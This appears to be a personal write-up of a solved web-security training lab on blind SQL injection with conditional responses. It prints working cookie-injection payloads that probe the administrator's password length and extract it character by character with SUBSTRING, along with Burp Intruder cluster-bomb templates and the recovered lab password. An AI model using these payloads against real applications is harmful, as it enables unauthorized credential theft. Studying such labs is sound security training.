# Lab 11 - Blind SQL injection with conditional responses

**Status**: Solved on August 3, 2023

**Objective**: Find the password for `administrator`, and the log in as the `administrator` user.

## Solving Process

- As described in the lab info, the web app displays a `Welcome back` message, if the query injected in the Cookie returns any rows. So we can list the `administrator` password by injecting our listing condition, and checking when that message is displayed to confirm which values return a `true` condition.
- The payload to get the password number of characters is the following: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=20)='a`. It'll return the message when the length value matches that of the `administrator`'s password.
  - The Intruder payload to iterate the password length is built as follows: `' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=§1§)='a`
  - The attack is setup in Intruder, and the response length for 20 characters is the one that displays the welcome message, confirming that the password length is 20
- To check the first password character, the following payload was used: `' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
  - The payload in Intruder, iterates the substring position and the corresponding character, and it goes like this: `' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§`
  - The intruder attack was set up as a “Cluster bomb”. The character position payload is of type `number`, and the character payload is of type `brute forcer`
  - The correct password characters are the ones that output the longest responses (since “you’re welcome” is shown when the condition evaluates to `true`)
  - Password: `ddgb8hggtqpkd02ye1z7`
